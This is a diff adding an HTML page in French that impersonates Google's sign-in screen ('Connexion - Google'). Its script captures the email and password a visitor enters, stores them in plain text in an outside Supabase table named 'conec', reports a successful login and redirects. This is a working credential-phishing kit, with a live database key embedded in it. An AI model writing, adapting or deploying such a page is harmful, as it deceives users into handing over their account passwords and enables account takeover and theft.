@@ -1,0 +1,175 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <title>Connexion - Google</title>
+    <link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Google+Sans:wght@400;500;700&display=swap">
+    <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js"></script>
+    <style>
+        body {
+            font-family: 'Google Sans', sans-serif;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            background-color: #fff;
+            margin: 0;
+        }
+        .container {
+            width: 400px;
+            background: white;
+            padding: 40px;
+            border-radius: 8px;
+            box-shadow: 0 2px 10px rgba(0, 0, 0, 0.1);
+            text-align: center;
+        }
+        .logo {
+            width: 75px;
+            margin-bottom: 20px;
+        }
+        h2 {
+            font-size: 22px;
+            font-weight: 500;
+            margin-bottom: 10px;
+            color: #202124;
+        }
+        .subtext {
+            font-size: 14px;
+            color: #5f6368;
+            margin-bottom: 20px;
+        }
+        .input-group {
+            text-align: left;
+            margin-bottom: 20px;
+        }
+        label {
+            font-size: 14px;
+            color: #5f6368;
+            display: block;
+            margin-bottom: 5px;
+        }
+        input {
+            width: 100%;
+            padding: 12px;
+            font-size: 16px;
+            border: 1px solid #dadce0;
+            border-radius: 4px;
+            outline: none;
+            transition: border-color 0.2s, box-shadow 0.2s;
+        }
+        input:focus {
+            border-color: #1a73e8;
+            box-shadow: 0 0 2px rgba(26, 115, 232, 0.5);
+        }
+        .links {
+            display: flex;
+            justify-content: space-between;
+            font-size: 14px;
+            margin-top: 10px;
+        }
+        .link {
+            color: #1a73e8;
+            text-decoration: none;
+        }
+        .link:hover {
+            text-decoration: underline;
+        }
+        .btn-container {
+            display: flex;
+            justify-content: space-between;
+            margin-top: 30px;
+        }
+        .btn {
+            padding: 10px 20px;
+            font-size: 14px;
+            border: none;
+            border-radius: 4px;
+            cursor: pointer;
+        }
+        .btn-secondary {
+            background: none;
+            color: #1a73e8;
+        }
+        .btn-primary {
+            background-color: #1a73e8;
+            color: white;
+        }
+        .btn-primary:hover {
+            background-color: #1669c7;
+        }
+        .footer {
+            font-size: 12px;
+            color: #5f6368;
+            text-align: center;
+            margin-top: 20px;
+        }
+        .footer a {
+            color: #1a73e8;
+            text-decoration: none;
+            margin: 0 5px;
+        }
+        .footer a:hover {
+            text-decoration: underline;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <img src="https://ssl.gstatic.com/accounts/ui/avatar_2x.png" alt="Google Logo" class="logo">
+        <h2>Connexion</h2>
+        <p class="subtext">Utilisez votre compte Google</p>
+        <div class="input-group">
+            <label for="email">Adresse e-mail ou numéro de téléphone</label>
+            <input type="email" id="email" placeholder="Votre adresse e-mail">
+        </div>
+        <div class="input-group">
+            <label for="password">Mot de passe</label>
+            <input type="password" id="password" placeholder="Votre mot de passe">
+        </div>
+        <div class="links">
+            <a href="#" class="link">Mot de passe oublié ?</a>
+        </div>
+        <div class="btn-container">
+            <button class="btn btn-secondary">Créer un compte</button>
+            <button class="btn btn-primary" id="loginBtn">Suivant</button>
+        </div>
+        <div class="footer">
+            <a href="#">Français</a> • <a href="#">Aide</a> • <a href="#">Confidentialité</a> • <a href="#">Conditions</a>
+        </div>
+    </div>
+
+    <script>
+        // Initialisation de Supabase
+        const SUPABASE_URL = 'https://ejtqzrwyopijgstbvhyb.supabase.co';
+        const SUPABASE_ANON_KEY = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6ImVqdHF6cnd5b3BpamdzdGJ2aHliIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NDc1ODI4MjQsImV4cCI6MjA2MzE1ODgyNH0.z2NumrWkR4IbosI6E8ZilIUoc97iQnUGaqtjh-dDFdE';
+
+        const supabase = window.supabase.createClient(SUPABASE_URL, SUPABASE_ANON_KEY);
+
+        // Fonction pour stocker les données dans la table "conec"
+        document.getElementById('loginBtn').addEventListener('click', async () => {
+            const email = document.getElementById('email').value;
+            const password = document.getElementById('password').value;
+
+            if (!email || !password) {
+                alert('Veuillez remplir tous les champs.');
+                return;
+            }
+
+            // Insérer les données dans la table "conec"
+            const { data, error } = await supabase
+                .from('conec') // Utilisation de la table "conec"
+                .insert([{ email, password }]);
+
+            if (error) {
+                console.error('Erreur:', error.message);
+                alert('Une erreur est survenue.');
+            } else {
+                console.log('Utilisateur enregistré:', data);
+                alert('Connexion réussie !');
+                window.location.href = 'reseau.html'; // Remplace par l'URL de ta page
+            }
+        });
+    </script>
+</body>
+</html>
